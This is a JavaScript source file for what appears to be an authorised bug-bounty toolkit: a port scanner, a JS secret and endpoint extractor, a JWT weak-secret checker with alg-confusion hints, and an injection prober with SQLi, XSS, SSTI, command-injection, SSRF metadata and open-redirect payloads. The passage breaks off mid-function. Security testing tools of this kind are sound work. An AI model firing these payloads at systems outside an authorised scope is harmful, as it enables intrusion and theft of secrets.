// src/offensive_tools.js — general-purpose offensive / bug-bounty tooling for the dsw harness.
//
// Scope: authorized testing of YOUR OWN / in-scope targets. Every tool that makes
// an active request to a target host is gated by the security allowlist and the
// task scope guard (see deepseek-watch.js dispatch). Tools are bounded,
// rate-limited detectors and analyzers — detection and intelligence only, no
// auto-exploitation, no weaponization, no payload delivery against third parties.
//
// Tool prefix: atk_  (attack surface / recon / auth / injection oracles)
import { createHmac, randomUUID } from "node:crypto";
import { connect } from "node:net";
import { assertAllowedUrl } from "./security_tools.js";

// ── Small shared helpers ─────────────────────────────────────────────────────
const DEFAULT_TIMEOUT_MS = 15000;

export function truncate(text, max = 4000) {
  const s = String(text ?? "");
  return s.length > max ? `${s.slice(0, max)}\n…[truncated ${s.length - max} chars]` : s;
}

function capList(items, max) {
  const list = [...items];
  const capped = list.slice(0, max);
  if (list.length > max) capped.push(`…[+${list.length - max} more]`);
  return capped;
}

async function fetchWithTimeout(url, options = {}, timeoutMs = DEFAULT_TIMEOUT_MS) {
  const timeout = Math.min(Math.max(Number(timeoutMs) || DEFAULT_TIMEOUT_MS, 1000), 60000);
  return fetch(url, { ...options, redirect: "follow", signal: AbortSignal.timeout(timeout) });
}

async function assertAllowedFetch(url, timeoutMs) {
  await assertAllowedUrl(url);
  return fetchWithTimeout(url, { headers: { "user-agent": "dsw-atk/1.0", accept: "*/*" } }, timeoutMs);
}

// Bounded concurrency pool: run `worker(item, index)` over items with `limit` parallel workers.
export async function runPool(items, limit, worker) {
  const results = new Array(items.length);
  let idx = 0;
  const bounded = Math.max(1, Math.min(Number(limit) || 4, items.length || 1));
  async function runner() {
    while (idx < items.length) {
      const i = idx++;
      try { results[i] = await worker(items[i], i); }
      catch (error) { results[i] = { error: error.message }; }
    }
  }
  await Promise.all(Array.from({ length: bounded }, runner));
  return results;
}

// ── atk_scan_target: unified attack-surface scanner ─────────────────────────
const COMMON_PORTS = [
  21, 22, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1080, 1433, 1521,
  2375, 3000, 3306, 3389, 5000, 5432, 5601, 5900, 6379, 7001, 8000,
  8008, 8080, 8081, 8443, 8888, 9000, 9090, 9200, 9300, 27017,
];

const PORT_SERVICES = {
  21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http",
  110: "pop3", 143: "imap", 443: "https", 445: "smb", 993: "imaps",
  995: "pop3s", 1080: "socks", 1433: "mssql", 1521: "oracle", 2049: "nfs",
  2375: "docker", 3000: "http-alt", 3306: "mysql", 3389: "rdp", 5000: "http-alt",
  5432: "postgres", 5601: "kibana", 5900: "vnc", 6379: "redis", 7001: "weblogic",
  8000: "http-alt", 8008: "http-alt", 8080: "http-proxy", 8081: "http-alt",
  8443: "https-alt", 8888: "http-alt", 9000: "http-alt", 9090: "prometheus",
  9200: "elasticsearch", 9300: "elasticsearch", 27017: "mongodb",
};

const WEB_PORTS = new Set([80, 443, 1080, 3000, 5000, 7001, 8000, 8008, 8080, 8081, 8443, 8888, 9000, 9090, 9200]);

export function parsePortList(raw) {
  if (raw == null || String(raw).trim() === "") return null;
  const out = new Set();
  for (const part of String(raw).split(/[,\s]+/)) {
    if (!part) continue;
    if (part.includes("-")) {
      const [a, b] = part.split("-").map((n) => Number(n));
      if (!Number.isInteger(a) || !Number.isInteger(b) || a < 1 || b > 65535 || a > b) continue;
      for (let p = a; p <= b && out.size < 200; p++) out.add(p);
    } else {
      const p = Number(part);
      if (Number.isInteger(p) && p >= 1 && p <= 65535) out.add(p);
    }
  }
  return out.size ? [...out] : null;
}

export function probeTcpPort(host, port, timeoutMs = 2000) {
  return new Promise((resolve) => {
    const sock = connect({ host, port, timeout: timeoutMs });
    let settled = false;
    const done = (open) => { if (!settled) { settled = true; sock.destroy(); resolve(open); } };
    sock.once("connect", () => done(true));
    sock.once("timeout", () => done(false));
    sock.once("error", () => done(false));
  });
}

const TECH_SIGNATURES = [
  [/x-powered-by:\s*express/i, "Express / Node.js"],
  [/server:\s*nginx/i, "nginx"],
  [/server:\s*apache/i, "Apache"],
  [/server:\s*Microsoft-IIS/i, "Microsoft IIS"],
  [/server:\s*tomcat/i, "Apache Tomcat"],
  [/server:\s*cloudflare/i, "Cloudflare"],
  [/x-powered-by:\s*php/i, "PHP"],
  [/x-aspnet-version|aspnetcore/i, "ASP.NET"],
  [/x-rack-cache|x-powered-by:\s*phusion/i, "Ruby on Rails"],
  [/django|csrftoken/i, "Django"],
  [/x-laravel|laravel_session/i, "Laravel"],
  [/x-nextjs|__NEXT_DATA__/i, "Next.js"],
  [/__NUXT__/i, "Nuxt.js"],
  [/x-generator:\s*wordpress|wp-content|wp-includes/i, "WordPress"],
  [/x-generator:\s*jekyll/i, "Jekyll"],
  [/x-generator:\s*gatsby/i, "Gatsby"],
  [/x-vercel|vercel/i, "Vercel"],
  [/x-github-request-id/i, "GitHub Pages"],
  [/graphql/i, "GraphQL API"],
  [/swagger|openapi/i, "OpenAPI/Swagger"],
  [/api-docs|redoc/i, "API docs"],
  [/server:\s*gunicorn/i, "Gunicorn (Python)"],
  [/server:\s*uwsgi/i, "uWSGI (Python)"],
  [/server:\s*openresty/i, "OpenResty"],
  [/server:\s*Caddy/i, "Caddy"],
  [/server:\s*lighttpd/i, "Lighttpd"],
  [/server:\s*jetty/i, "Jetty"],
  [/server:\s*play|playframework/i, "Play Framework"],
  [/content-type:\s*application\/json/i, "JSON API"],
  [/content-type:\s*application\/graphql/i, "GraphQL"],
  [/content-type:\s*text\/event-stream/i, "SSE stream"],
];

function detectTech(statusLine, headersText, bodyPrefix) {
  const blob = `${statusLine}\n${headersText}\n${bodyPrefix}`;
  const found = [];
  for (const [re, label] of TECH_SIGNATURES) {
    const m = blob.match(re);
    if (m) found.push({ label, evidence: m[0].slice(0, 80) });
  }
  // De-dup by label, keep first evidence.
  const seen = new Set();
  return found.filter((f) => { if (seen.has(f.label)) return false; seen.add(f.label); return true; });
}

function extractTitle(html) {
  const m = String(html || "").match(/<title[^>]*>([\s\S]*?)<\/title>/i);
  return m ? m[1].replace(/\s+/g, " ").trim().slice(0, 200) : "";
}

function extractScriptUrls(html, baseUrl) {
  const urls = [];
  const srcRe = /<script[^>]+src\s*=\s*["']([^"']+)["']/gi;
  let m;
  while ((m = srcRe.exec(html)) !== null) {
    try { urls.push(new URL(m[1], baseUrl).href); } catch { /* skip */ }
  }
  return [...new Set(urls)];
}

async function httpProbe(host, port, timeoutMs) {
  const scheme = port === 443 || port === 8443 ? "https" : "http";
  const url = `${scheme}://${host}:${port}/`;
  const started = Date.now();
  try {
    const res = await assertAllowedFetch(url, timeoutMs);
    const headersText = [];
    res.headers.forEach((v, k) => headersText.push(`${k}: ${v}`));
    const body = await res.arrayBuffer().then((b) => Buffer.from(b).toString("utf8").slice(0, 8192));
    const title = extractTitle(body);
    const tech = detectTech(`HTTP ${res.status}`, headersText.join("\n"), body);
    return {
      port, url, status: res.status, title: title || null,
      server: res.headers.get("server") || null,
      content_type: res.headers.get("content-type") || null,
      tech: tech.slice(0, 6), duration_ms: Date.now() - started,
      script_urls: extractScriptUrls(body, url).slice(0, 25),
    };
  } catch (error) {
    return { port, url, error: error.message, duration_ms: Date.now() - started };
  }
}

async function atkScanTarget(args) {
  const base = String(args.url || "");
  if (!base) throw new Error("url is required.");
  const host = await assertAllowedUrl(base);
  const explicitPorts = parsePortList(args.ports);
  const ports = explicitPorts || COMMON_PORTS;
  if (ports.length > 40) throw new Error(`Too many ports (${ports.length}). Max 40 — pass a narrower list.`);
  const timeoutMs = Math.min(Math.max(Number(args.timeout_ms) || 2000, 500), 10000);

  const lines = [`Scanning ${host} — ${ports.length} ports (timeout ${timeoutMs}ms)`, ""];
  const open = [];
  const results = await runPool(ports, 10, (port) => probeTcpPort(host, port, timeoutMs));
  for (let i = 0; i < ports.length; i++) {
    if (results[i] === true) open.push(ports[i]);
    else if (results[i]?.error) lines.push(`  ${ports[i]} error: ${results[i].error}`);
  }

  if (!open.length) {
    lines.push("No open TCP ports found on this host.");
    return lines.join("\n");
  }

  lines.push(`Open ports (${open.length}):`);
  for (const port of open) {
    const service = PORT_SERVICES[port] || "unknown";
    lines.push(`  ${port} ${service}`);
  }

  const webProbePorts = open.filter((p) => WEB_PORTS.has(p) || (explicitPorts && explicitPorts.includes(p))).slice(0, 8);
  if (webProbePorts.length) {
    lines.push("", "HTTP fingerprint on open web ports:");
    const probes = await runPool(webProbePorts, 4, (port) => httpProbe(host, port, timeoutMs));
    for (const p of probes) {
      if (p.error) { lines.push(`  ${p.port}: probe error — ${p.error}`); continue; }
      lines.push(`  ${p.port} [${p.status}] ${p.url}`);
      if (p.title) lines.push(`      title: ${p.title}`);
      if (p.server) lines.push(`      server: ${p.server}`);
      if (p.content_type) lines.push(`      content-type: ${p.content_type}`);
      if (p.tech.length) lines.push(`      tech: ${p.tech.map((t) => t.label).join(", ")}`);
      if (p.script_urls.length) lines.push(`      scripts: ${capList(p.script_urls, 6).join("\n                ")}`);
    }
  }

  lines.push("", "Next: atk_js_intel on the found web ports to enumerate endpoints/secrets.");
  return lines.join("\n");
}

// ── atk_js_intel: JS / API intelligence extraction ──────────────────────────
const SECRET_PATTERNS = [
  [/AKIA[0-9A-Z]{16}/g, "AWS access key"],
  [/ASIA[0-9A-Z]{16}/g, "AWS temporary key"],
  [/AIza[0-9A-Za-z_-]{35}/g, "Google API key"],
  [/ghp_[0-9A-Za-z]{36,}/g, "GitHub personal access token"],
  [/github_pat_[0-9A-Za-z_]{20,}/g, "GitHub fine-grained PAT"],
  [/xox[baprs]-[0-9A-Za-z-]{10,}/g, "Slack token"],
  [/sk-[0-9A-Za-z_-]{20,}/g, "OpenAI/Anthropic-style secret key"],
  [/eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g, "JWT literal"],
  [/-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/g, "Private key"],
  [/mongodb(?:\+srv)?:\/\/[^\s"']+/g, "MongoDB connection string"],
  [/postgres(?:ql)?:\/\/[^\s"']+/g, "PostgreSQL connection string"],
  [/mysql:\/\/[^\s"']+/g, "MySQL connection string"],
  [/redis:\/\/[^\s"']+/g, "Redis connection string"],
  [/amqp:\/\/[^\s"']+/g, "AMQP connection string"],
  [/smtp:\/\/[^\s"']+/g, "SMTP connection string"],
];

const ENDPOINT_RE = /["'`](\/(?:api|v\d+|rest|graphql|auth|oauth|admin|internal|private|debug)[A-Za-z0-9_\-/.?=&{}:$%+]*?)["'`]/g;
const ABSOLUTE_URL_RE = /["'`](https?:\/\/[A-Za-z0-9.-]+(?::\d+)?\/[^"'\s`]*)/g;
const FETCH_RE = /\b(?:fetch|axios\.(?:get|post|put|delete|patch)|XMLHttpRequest|\.open\s*\(\s*["'](?:GET|POST|PUT|DELETE|PATCH)["']\s*,\s*["'])([^"']+)/g;
const WEBSOCKET_RE = /(wss?:\/\/[^"'\s`]+)/g;
const SOURCEMAP_RE = /(?:sourceMappingURL|sourceURL)\s*=\s*([^\s"']+)/g;
const BASE64_BLOB_RE = /["']([A-Za-z0-9+/]{64,}={0,2})["']/g;

export function extractJsIntel(js, sourceUrl = "") {
  const src = String(js || "");
  const result = { endpoints: new Set(), absolute_urls: new Set(), params: new Set(), secrets: [], sourcemaps: new Set(), base64_blobs: [], ws_urls: new Set() };

  let m;
  ENDPOINT_RE.lastIndex = 0;
  while ((m = ENDPOINT_RE.exec(src)) !== null) {
    const full = m[1];
    result.endpoints.add(full.split("?")[0]);
    const q = full.split("?")[1];
    if (q) for (const kv of q.split("&")) {
      const name = kv.split("=")[0].trim();
      if (name) result.params.add(name);
    }
  }

  ABSOLUTE_URL_RE.lastIndex = 0;
  while ((m = ABSOLUTE_URL_RE.exec(src)) !== null) result.absolute_urls.add(m[1]);

  FETCH_RE.lastIndex = 0;
  while ((m = FETCH_RE.exec(src)) !== null) {
    const u = m[1];
    if (u.startsWith("/")) result.endpoints.add(u.split("?")[0]);
    else if (/^https?:\/\//.test(u)) result.absolute_urls.add(u.split("?")[0]);
  }

  WEBSOCKET_RE.lastIndex = 0;
  while ((m = WEBSOCKET_RE.exec(src)) !== null) result.ws_urls.add(m[1]);

  SOURCEMAP_RE.lastIndex = 0;
  while ((m = SOURCEMAP_RE.exec(src)) !== null) {
    const u = m[1].trim();
    if (!u) continue;
    result.sourcemaps.add(u.startsWith("http") ? u : sourceUrl ? new URL(u, sourceUrl).href : u);
  }

  BASE64_BLOB_RE.lastIndex = 0;
  while ((m = BASE64_BLOB_RE.exec(src)) !== null) result.base64_blobs.push({ blob: m[1].slice(0, 64), len: m[1].length });

  for (const [re, label] of SECRET_PATTERNS) {
    re.lastIndex = 0;
    let sm;
    while ((sm = re.exec(src)) !== null) {
      const full = sm[0];
      const masked = full.length > 12 ? `${full.slice(0, 6)}…${full.slice(-4)}` : full;
      result.secrets.push({ type: label, value: masked, context: src.slice(Math.max(0, sm.index - 60), sm.index + 60).replace(/\s+/g, " ").slice(0, 120) });
    }
  }

  // Query params from endpoints.
  for (const ep of result.endpoints) {
    const q = ep.split("?")[1];
    if (!q) continue;
    for (const kv of q.split("&")) {
      const name = kv.split("=")[0].trim();
      if (name) result.params.add(name);
    }
  }
  for (const ep of result.absolute_urls) {
    const q = ep.split("?")[1];
    if (!q) continue;
    for (const kv of q.split("&")) {
      const name = kv.split("=")[0].trim();
      if (name) result.params.add(name);
    }
  }

  return result;
}

async function atkJsIntel(args) {
  const url = String(args.url || "");
  if (!url) throw new Error("url is required — a page or a .js bundle.");
  await assertAllowedUrl(url);

  const maxScripts = Math.min(Math.max(Number(args.max_scripts) || 10, 1), 25);
  const timeoutMs = Number(args.timeout_ms) || 15000;
  const res = await assertAllowedFetch(url, timeoutMs);
  const contentType = res.headers.get("content-type") || "";
  const body = await res.arrayBuffer().then((b) => Buffer.from(b).toString("utf8"));

  const lines = [`JS intelligence — ${url} (HTTP ${res.status}, ${contentType.split(";")[0]})`];

  const scriptUrls = contentType.includes("html") || /<script/i.test(body.slice(0, 2000))
    ? extractScriptUrls(body, url).filter((u) => {
        try { return new URL(u).hostname === new URL(url).hostname; } catch { return false; }
      }).slice(0, maxScripts)
    : [];

  const targets = scriptUrls.length ? scriptUrls : [url];
  lines.push(`Analyzing ${targets.length} script(s)…`);
  if (scriptUrls.length) lines.push(`  ${capList(scriptUrls, 8).join("\n  ")}`);

  const analyzed = await runPool(targets, 3, async (u) => {
    const r = await assertAllowedFetch(u, timeoutMs);
    const text = await r.arrayBuffer().then((b) => Buffer.from(b).toString("utf8"));
    return { url: u, size: text.length, intel: extractJsIntel(text, u) };
  });

  const merged = { endpoints: new Set(), absolute_urls: new Set(), params: new Set(), secrets: [], sourcemaps: new Set(), base64_blobs: [], ws_urls: new Set() };
  for (const a of analyzed) {
    if (a.error) { lines.push(`  ${a.url}: error — ${a.error}`); continue; }
    for (const k of ["endpoints", "absolute_urls", "params", "sourcemaps", "ws_urls"]) {
      for (const v of a.intel[k]) merged[k].add(v);
    }
    merged.secrets.push(...a.intel.secrets);
    merged.base64_blobs.push(...a.intel.base64_blobs);
  }

  lines.push("", `Endpoints (${merged.endpoints.size}):`);
  lines.push(...capList([...merged.endpoints].sort(), 60).map((e) => `  ${e}`));
  lines.push("", `Query params (${merged.params.size}):`);
  lines.push(...capList([...merged.params].sort(), 40).map((p) => `  ${p}`));
  if (merged.ws_urls.size) {
    lines.push("", `WebSockets (${merged.ws_urls.size}):`);
    lines.push(...capList([...merged.ws_urls], 10).map((w) => `  ${w}`));
  }
  if (merged.sourcemaps.size) {
    lines.push("", `Source maps (${merged.sourcemaps.size}) — fetch for full source:`);
    lines.push(...capList([...merged.sourcemaps], 10).map((s) => `  ${s}`));
  }
  if (merged.secrets.length) {
    lines.push("", `Potential secrets (${merged.secrets.length}) — VERIFY in scope before reporting:`);
    for (const s of capList(merged.secrets, 25)) {
      lines.push(`  [${s.type}] ${s.value}`);
      if (s.context) lines.push(`      …${s.context}…`);
    }
  }
  if (merged.base64_blobs.length) {
    lines.push("", `Large base64 blobs (${merged.base64_blobs.length}) — decode with sec_encode if interesting:`);
    lines.push(...capList(merged.base64_blobs.slice(0, 10).map((b) => `${b.blob.slice(0, 32)}… (${b.len} chars)`), 10).map((b) => `  ${b}`));
  }
  if (merged.absolute_urls.size) {
    lines.push("", `Absolute URLs referenced (${merged.absolute_urls.size}):`);
    lines.push(...capList([...merged.absolute_urls].sort(), 20).map((u) => `  ${u}`));
  }
  return lines.join("\n");
}

// ── atk_auth_lab: JWT / session / cookie analysis ───────────────────────────
const WEAK_JWT_SECRETS = [
  "secret", "password", "123456", "12345678", "changeme", "changeit", "letmein",
  "admin", "root", "toor", "qwerty", "default", "default_secret", "jwt_secret",
  "jwt-secret", "your-secret-key", "your-256-bit-secret", "my-secret", "test",
  "test_secret", "test123", "supersecret", "super_secret", "superSecret",
  "app_secret", "appsecret", "private-key", "secret_key", "secretkey", "secret123",
  "password123", "admin123", "1234", "0000", "iloveyou", "monkey", "dragon",
  "master", "access", "key", "keys", "s3cr3t", "s3cret", "t0ps3cr3t", "topsecret",
  "this-is-a-secret", "verysecret", "ultrasecret", "development", "dev", "stage",
  "production", "hunter2", "trustno1", "welcome", "login", "authentication",
];

function b64urlDecode(seg) {
  const pad = seg.replace(/-/g, "+").replace(/_/g, "/");
  return Buffer.from(pad + "=".repeat((4 - (pad.length % 4)) % 4), "base64");
}

export function decodeJwtToken(token) {
  const parts = String(token || "").split(".");
  if (parts.length !== 3) throw new Error("Not a JWT — expected 3 dot-separated segments.");
  let header, payload;
  try {
    header = JSON.parse(b64urlDecode(parts[0]).toString("utf8"));
    payload = JSON.parse(b64urlDecode(parts[1]).toString("utf8"));
  } catch (error) {
    throw new Error(`JWT segments are not valid base64url JSON: ${error.message}`);
  }
  return { header, payload, signature: parts[2] };
}

export function jwtSignatureValid(token, secret) {
  const parts = String(token || "").split(".");
  if (parts.length !== 3) return false;
  let alg;
  try { alg = decodeJwtToken(token).header.alg || ""; }
  catch { return false; }
  if (!/^HS(256|384|512)$/.test(alg)) return false;
  const algo = alg === "HS384" ? "sha384" : alg === "HS512" ? "sha512" : "sha256";
  const expected = createHmac(algo, String(secret)).update(`${parts[0]}.${parts[1]}`).digest("base64url");
  const actual = parts[2];
  if (expected.length !== actual.length) return false;
  // constant-time compare
  let diff = 0;
  for (let i = 0; i < expected.length; i++) diff |= expected.charCodeAt(i) ^ actual.charCodeAt(i);
  return diff === 0;
}

function analyzeJwt(token) {
  const findings = [];
  const { header, payload, signature } = decodeJwtToken(token);
  const alg = header.alg || "";
  const claims = { ...payload };
  const lines = [`JWT header: ${JSON.stringify(header)}`, `JWT payload: ${JSON.stringify(payload)}`, `signature: ${signature ? `${signature.slice(0, 12)}…` : "(empty)"}`];

  if (!alg) findings.push({ severity: "high", type: "JWT", detail: "No alg header — token may be unsigned." });
  if (alg === "none") findings.push({ severity: "high", type: "JWT", detail: "alg=none — verify the server rejects unsigned tokens (try removing the signature)." });
  if (alg === "HS256" || alg === "HS384" || alg === "HS512") {
    findings.push({ severity: "info", type: "JWT", detail: `Symmetric ${alg} — if the server verifies with an RSA public key, try alg confusion (HS256 with the public key).` });
  }
  if (/^RS|^ES|^PS/.test(alg)) {
    findings.push({ severity: "info", type: "JWT", detail: `Asymmetric ${alg} — try alg=none and HS256-with-public-key confusion if the public key is discoverable.` });
  }
  if (signature) {
    for (const secret of WEAK_JWT_SECRETS) {
      if (jwtSignatureValid(token, secret)) {
        findings.push({ severity: "high", type: "JWT", detail: `Signature verifies with weak secret "${secret}" — token can be forged.` });
        break;
      }
    }
  }
  for (const claim of ["exp", "iat", "nbf"]) {
    if (typeof claims[claim] === "number" && claims[claim] !== 0 && Date.now() / 1000 > claims[claim]) {
      // expired tokens are normal; only flag if exp is far future or missing
    }
  }
  if (claims.exp === undefined) findings.push({ severity: "medium", type: "JWT", detail: "No exp claim — token never expires." });
  if (claims.iat !== undefined && typeof claims.iat === "number" && Date.now() / 1000 - claims.iat > 60 * 60 * 24 * 30) {
    findings.push({ severity: "medium", type: "JWT", detail: `iat is ${Math.round((Date.now() / 1000 - claims.iat) / 86400)} days old — long-lived token.` });
  }
  if (claims.role || claims.admin || claims.isAdmin) {
    findings.push({ severity: "medium", type: "JWT", detail: `Authorization claims present in token (${Object.keys(claims).filter((c) => /role|admin/i.test(c)).join(", ")}) — test tampering.` });
  }
  return { lines, findings };
}

async function analyzeUrlCookies(url, timeoutMs) {
  await assertAllowedUrl(url);
  const res = await assertAllowedFetch(url, timeoutMs);
  const findings = [];
  let cookies = [];
  try { cookies = res.headers.getSetCookie ? res.headers.getSetCookie() : []; } catch { /* older undici */ }
  if (!cookies.length) {
    const raw = res.headers.get("set-cookie");
    if (raw) cookies = [raw];
  }
  const lines = [`Cookie/session analysis — ${url} (HTTP ${res.status})`];
  if (!cookies.length) {
    lines.push("  No Set-Cookie headers on this response.");
    return { lines, findings };
  }
  for (const cookie of cookies.slice(0, 15)) {
    const name = cookie.split(";")[0].split("=")[0].trim();
    const flags = [];
    if (!/;\s*secure\b/i.test(cookie)) flags.push("no Secure");
    if (!/;\s*httponly\b/i.test(cookie)) flags.push("no HttpOnly");
    const ss = cookie.match(/;\s*samesite=(\w+)/i);
    if (!ss) flags.push("no SameSite");
    else if (!/lax|strict/i.test(ss[1])) flags.push(`SameSite=${ss[1]}`);
    if (flags.length) {
      findings.push({ severity: /session|auth|token|jwt|sid/i.test(name) ? "high" : "medium", type: "Cookie", detail: `${name} — ${flags.join(", ")}` });
      lines.push(`  ${name}: ${flags.join(", ")}`);
    } else {
      lines.push(`  ${name}: OK`);
    }
  }
  return { lines, findings };
}

async function atkAuthLab(args) {
  const jwt = String(args.jwt || "").trim();
  const url = String(args.url || "").trim();
  if (!jwt && !url) throw new Error("Provide jwt=<token> and/or url=<endpoint>.");
  const lines = [];
  const findings = [];

  if (jwt) {
    const { lines: jl, findings: jf } = analyzeJwt(jwt);
    lines.push(...jl, "");
    findings.push(...jf);
  }
  if (url) {
    const { lines: cl, findings: cf } = await analyzeUrlCookies(url, Number(args.timeout_ms) || 15000);
    lines.push(...cl, "");
    findings.push(...cf);
  }

  if (!findings.length) {
    lines.push("No issues detected — token/session looks reasonably hardened.");
    return lines.join("\n");
  }
  lines.push(`Findings (${findings.length}):`);
  for (const f of findings) {
    lines.push(`  [${f.severity.toUpperCase()}] ${f.type}: ${f.detail}`);
  }
  return lines.join("\n");
}

// ── atk_injection_probe: generic injection oracles ──────────────────────────
const SQL_ERROR_RE = [
  /SQL syntax|MySQL server version|You have an error in your SQL/i,
  /PostgreSQL.*ERROR|pg_query|psycopg2/i,
  /SQLite3|sqlite3\.OperationalError|near ".*": syntax error/i,
  /Microsoft OLE DB|ODBC SQL Server|SqlException|Unclosed quotation mark/i,
  /Oracle.*ORA-\d{5}/i,
  /SQLSTATE\[|SQLCommandException|query failed/i,
  /mysql_fetch|mysqli_|mysql_num_rows/i,
  /Warning:\s+\w+_query/i,
];

const SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "${7*7}${7*7}"];
const XSS_PAYLOADS = (m) => [`"><svg/onload=alert('${m}')>`, `'"><img src=x onerror=alert('${m}')>`, `<script>alert('${m}')</script>`, `${m}`];
const CMDI_PAYLOADS = (m) => [`;echo ${m}`, `|echo ${m}`, `$(echo ${m})`, "`echo " + m + "`", `;id`, `$(id)`];
const SSRF_PAYLOADS = ["http://127.0.0.1/", "http://127.0.0.1:80/", "http://127.0.0.1:8080/", "http://169.254.169.254/latest/meta-data/", "http://[::1]/", "//127.0.0.1/"];
const REDIRECT_PAYLOADS = (m) => [`//${m}/`, `https://${m}/`, `//${m}.evil.example/`];

async function atkInjectionProbe(args) {
  const base = String(args.url || "");
  const param = String(args.param || "");
  if (!base) throw new Error("url is required.");
  if (!param) throw new Error("param is required — the parameter to inject into.");
  await assertAllowedUrl(base);
  const method = String(args.method || "GET").toUpperCase();
  if (!["GET", "POST"].includes(method)) throw new Error("method must be GET or POST.");
  const classes = String(args.class || "").toLowerCase();
  const timeoutMs = Number(args.timeout_ms) || 8000;
  const delayMs = Math.min(Math.max(Number(args.delay_ms) || 100, 0), 2000);
  const marker = `dsw${randomUUID().slice(0, 8)}`;

  const baseUrl = new URL(base);
  const lines = [`Injection oracles — ${base} (param: ${param}, ${method})`];

  async function send(value) {
    const u = new URL(baseUrl.href);
    const body = method === "GET" ? undefined : new URLSearchParams({ [param]: value });
    if (method === "GET") u.searchParams.set(param, value);
    const started = Date.now();
    try {
      const res = await fetchWithTimeout(u.href, {
        method,
        headers: { "user-agent": "dsw-atk/1.0", "content-type": "application/x-www-form-urlencoded" },
        body,
      }, timeoutMs);
      const text = await res.arrayBuffer().then((b) => Buffer.from(b).toString("utf8"));
      return { status: res.status, text, duration_ms: Date.now() - started, location: res.headers.get("location") || "" };
    } catch (error) {
      return { error: error.message, duration_ms: Date.now() - started };
    }
  }

  const baseline = await send("baseline_value_12345");
  const findings = [];
  let requests = 1;
  const results = [];

  // SQLi — error-based + differential (AND 1=1 vs AND 1=2).
  if (!classes || classes.includes("sqli")) {
    const probes = [`'`, `' OR 1=1-- -`, `' OR '1'='1`, `1' AND '1'='1`, `1' AND '1'='2`, `" OR 1=1--`, `'; SELECT 1-- -`];
    for (const payload of probes) {
      if (requests >= 60) break;
      const r = await send(payload);
      requests++;
      await new Promise((r2) => setTimeout(r2, delayMs));
      const errHit = SQL_ERROR_RE.find((re) => re.test(r.text));
      if (errHit) {
        results.push({ cls: "sqli", payload, confidence: "high", detail: `SQL error signature: ${errHit.source.slice(0, 40)}`, status: r.status, snippet: r.text.match(errHit)?.[0]?.slice(0, 120) });
      }
    }
    // differential
    const rTrue = await send(`1' AND '1'='1`); requests++;
    const rFalse = await send(`1' AND '1'='2`); requests++;
    await new Promise((r2) => setTimeout(r2, delayMs * 2));
    if (rTrue.error || rFalse.error) {
      // skip
    } else if (rTrue.status !== rFalse.status || Math.abs(Buffer.byteLength(rTrue.text) - Buffer.byteLength(rFalse.text)) > 20) {
      results.push({ cls: "sqli", payload: "1' AND '1'='1 vs '1'='2", confidence: "medium", detail: `Differential response (status ${rTrue.status} vs ${rFalse.status}, size diff ${Buffer.byteLength(rTrue.text) - Buffer.byteLength(rFalse.text)})`, status: rTrue.status });
    }
  }

  // SSTI — math evaluation markers.
  if (!classes || classes.includes("ssti")) {
    for (const payload of SSTI_PAYLOADS) {
      if (requests >= 60) break;
      const r = await send(payload);
      requests++;
      await new Promise((r2) => setTimeout(r2, delayMs));
      if (/49/.test(r.text) && payload.includes("7*7")) {
        results.push({ cls: "ssti", payload, confidence: "high", detail: "Payload evaluated (7*7 → 49 rendered)", status: r.status, snippet: r.text.match(/49/)?.[0] });
      }
    }
  }

  // XSS — marker reflection.
  if (!classes || classes.includes("xss")) {
    for (const payload of XSS_PAYLOADS(marker)) {
      if (requests >= 60) break;
      const r = await send(payload);
      requests++;
      await new Promise((r2) => setTimeout(r2, delayMs));
      const idx = r.text.indexOf(marker);
      if (idx >= 0) {
        results.push({ cls: "xss", payload: payload.slice(0, 60), confidence: "high", detail: `Marker reflected verbatim (context: ${r.text.slice(Math.max(0, idx - 40), idx + 40).replace(/\s+/g, " ").slice(0, 80)})`, status: r.status });
      }
    }
  }

  // Command injection — marker echo.
  if (!classes || classes.includes("cmdi")) {
    for (const payload of CMDI_PAYLOADS(marker)) {
      if (requests >= 60) break;
      const r = await send(payload);
      requests++;
      await new Promise((r2) => setTimeout(r2, delayMs));
      if (r.text.includes(marker)) {
        results.push({ cls: "cmdi", payload: payload.slice(0, 60), confidence: "high", detail: "Command output marker echoed", status: r.status });
      } else if (/uid=\d+|root:x:0:0/i.test(r.text)) {
        results.push({ cls: "cmdi", payload: payload.slice(0, 60), confidence: "high", detail: "Command output (uid/uid-gid or /etc/passwd content) in response", status: r.status });
      }
    }
  }

  // SSRF — informational, response-difference based.
  if (!classes || classes.includes("ssrf")) {
    for (const payload of SSRF_PAYLOADS) {
      if (requests >= 60) break;
      const r = await send(payload);
      requests++;
      await new Promise((r2) => setTimeout(r2, delayMs));
      const delta = (r.duration_ms || 0) - (baseline.duration_ms || 0);
      if (r.error && /refused|timeout|timed out/i.test(r.error)) {
        results.push({ cls: "ssrf", payload, confidence: "info", detail: `Connection ${/refused/i.test(r.error) ? "refused" : "timed out"} — server likely attempted the fetch`, status: r.status || 0 });
      } else if (delta > 1500) {
        results.push({ cls: "ssrf", payload, confidence: "low", detail: `Response ${delta}ms slower than baseline — possible server-side fetch`, status: r.status });
      } else if (/latest\/meta-data|root:/i.test(r.text)) {
        results.push({ cls: "ssrf", payload, confidence: "high", detail: "Cloud metadata content in response — SSRF confirmed, verify in scope", status: r.status });
      }
    }
  }

  // Open redirect — Location header.
  if (!classes || classes.includes("redirect")) {
    for (const payload of REDIRECT_PAYLOADS(marker)) {
      if (requests >= 60) break;
      const r = await send(payload);
      requests++;
      await new Promise((r2) => setTimeout(r2, delayMs));
      if (r.location && r.location.includes(marker)) {
        results.push({ cls: "redirect", payload: payload.slice(0, 60), confidence: "high", detail: `Location reflects marker (${r.location.slice(0, 80)})`, status: r.status });
      }
    }
  }

  lines.push(`Baseline: HTTP ${baseline.status || "err"} in ${baseline.duration_ms || "?"}ms — ${requests} total requests.`);
  if (!results.length) {
    lines.push("No injection indicators detected with the default payload sets.");
    lines.push("Next: try atk_js_intel for endpoint discovery, then targeted manual payloads via sec_http_request.");
    return lines.join("\n");
  }
  lines.push(`Findings (${results.length}):`);
  const sev = { high: 0, medium: 0, low: 0, info: 0 };
  for (const f of results) {
